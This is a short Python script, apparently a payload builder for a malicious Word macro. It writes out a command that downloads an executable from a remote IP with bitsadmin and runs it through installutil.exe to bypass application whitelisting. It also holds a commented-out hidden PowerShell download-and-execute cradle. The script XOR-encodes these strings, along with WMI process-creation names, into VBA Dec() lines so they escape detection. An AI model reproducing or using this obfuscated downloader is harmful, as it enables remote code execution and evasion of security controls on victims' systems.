key = 0x6F
url = "http://192.168.49.67/InstallUtil.exe"

p = f"cmd /c \"bitsadmin /Transfer job5 /download /priority FOREGROUND {url} c:\\windows\\tasks\\run.exe && C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\windows\\tasks\\run.exe\""
#p = f"powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('{url}'))"
doc = "info.doc"
wmi1 = "winmgmts:"
wmi2 = "Win32_Process"

print(p)

def xor_hex(s): return ''.join(f"{ord(c)^key:02X}" for c in s)

print("a =", f'Dec("{xor_hex(doc)}")')
print("b =", f'Dec("{xor_hex(p)[:75]}" _')
print("         &", f'"{xor_hex(p)[75:150]}" _')
print("         &", f'"{xor_hex(p)[150:225]}" _')
print("         &", f'"{xor_hex(p)[225:]}" )')
print("c =", f'Dec("{xor_hex(wmi1)}")')
print("d =", f'Dec("{xor_hex(wmi2)}")')
